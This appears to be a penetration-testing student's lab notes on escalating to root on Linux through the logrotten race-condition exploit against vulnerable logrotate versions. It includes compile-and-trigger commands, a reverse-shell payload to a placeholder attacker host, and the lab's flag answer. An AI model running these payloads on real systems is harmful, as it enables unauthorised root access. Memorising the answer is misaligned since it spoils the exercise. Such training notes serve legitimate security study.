# Section 17 — Logrotate

## ID
535

## Module
Linux Privilege Escalation

## Kind
notes

## Title
Section 17 — Logrotate

## Description
Covers privilege escalation by exploiting a race condition in vulnerable versions of logrotate using the logrotten tool, which hijacks log rotation to execute arbitrary commands as root.

## Tags
privesc, logrotate, logrotten, race-condition, cron, linux

## Commands
- grep "create\|compress" /etc/logrotate.conf | grep -v "#"
- cat /etc/logrotate.conf
- ls /etc/logrotate.d/
- cat /var/lib/logrotate.status
- find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
- gcc -o logrotten logrotten.c
- echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' > payload
- echo test >> <LOG_FILE>; ./logrotten <LOG_FILE> -p payload

## What This Section Covers
Logrotate manages log file rotation (archiving, compressing, deleting old logs) and typically runs as root via cron. Certain versions (3.8.6, 3.11.0, 3.15.0, 3.18.0) are vulnerable to a race condition: when logrotate processes a log file, the logrotten exploit renames the log directory and replaces it with a symlink to a privileged directory like `/etc/bash_completion.d`. The payload file ends up in that directory and executes as root the next time a user logs in or a shell is spawned.

## Methodology
1. **Identify writable log files** — `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`. Look for log files that are world-writable and appear to be rotated regularly.
2. **Check logrotate mode** — `grep "create\|compress" /etc/logrotate.conf | grep -v "#"`. This tells you whether logrotate uses `create` (default logrotten mode) or `compress` (use `logrotten -c`).
3. **Confirm logrotate is running** — check cron configs or use `pspy` to observe logrotate executing as UID=0.
4. **Transfer and compile logrotten** — clone from GitHub on attack box, `scp` to target, then `gcc -o logrotten logrotten.c`.
5. **Create payload** — either a reverse shell (`bash -i >& /dev/tcp/IP/PORT 0>&1`) or a command that exfiltrates the flag (`cat /root/flag.txt > /home/user/flag.txt`).
6. **Trigger rotation and exploit** — write to the log file to force a size change, then immediately run logrotten: `echo test >> /path/to/access.log; ./logrotten /path/to/access.log -p payload`.
7. **Wait for execution** — logrotten races logrotate, creates a symlink to `/etc/bash_completion.d`, and the payload executes as root on next shell spawn or login.

## Multi-step Workflow (optional)
```
# On attack box — clone and transfer
git clone https://github.com/whotwagner/logrotten.git
scp -r logrotten/ htb-student@<TARGET_IP>:~/

# On target — compile
cd ~/logrotten
gcc -o logrotten logrotten.c

# Check logrotate mode
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

# Create payload (option A: exfiltrate flag)
echo "cat /root/flag.txt > /home/htb-student/flag.txt" > payload

# Create payload (option B: reverse shell)
# echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1' > payload

# Trigger and exploit
echo test >> /home/htb-student/backups/access.log; ./logrotten /home/htb-student/backups/access.log -p payload

# Read the flag
cat /home/htb-student/flag.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Submit contents of flag.txt | HTB{l0G_r0t7t73N_00ps} | Compiled logrotten → payload exfiltrates flag → triggered rotation → cat flag |

## Key Takeaways
- Logrotten exploits a **race condition** (TOCTOU) — between when logrotate checks the directory and when it writes the rotated file, logrotten swaps the directory for a symlink to `/etc/bash_completion.d`. The payload lands there and executes as root.
- The exploit requires three conditions: (1) write permissions on the log file, (2) logrotate running as root (which is almost always the case), (3) a vulnerable logrotate version (3.8.6, 3.11.0, 3.15.0, 3.18.0).
- The `create` vs `compress` distinction matters — `create` is the default mode where logrotate creates a new empty log file after rotation. `compress` mode gzips the old file. Logrotten needs to know which to exploit correctly (use `-c` flag for compress mode).
- `/etc/bash_completion.d/` is the symlink target because scripts placed there execute automatically whenever a bash shell starts — so the payload fires when root (or anyone) opens a new shell.
- The payload executes only once and briefly — a reverse shell is more reliable than reading files because timing matters. In the lab, the file exfiltration trick works because we control when we read it.
- This is a niche exploit but shows up on CTFs and exams — the key recognition trigger is: "I have write access to a log file that's being rotated by root."

## Gotchas
- **Timing is critical** — you need to write to the log file AND run logrotten before the next rotation cycle. Chaining them with `;` in one command ensures logrotten is watching when the rotation triggers.
- If the payload doesn't fire, it may be because logrotate hasn't run yet — check cron timing or force rotation with `sudo logrotate -f /etc/logrotate.conf` if you have sudo access (unlikely in a real scenario).
- The exploit creates a `backups2` directory and a symlink — this is forensically noisy and visible to other users on the system.
- If `gcc` isn't on the target, cross-compile on your attack box for the target architecture and transfer the binary.
- The reverse shell payload won't persist — it only runs once during the rotation event. If you miss the connection, you need to trigger the exploit again.
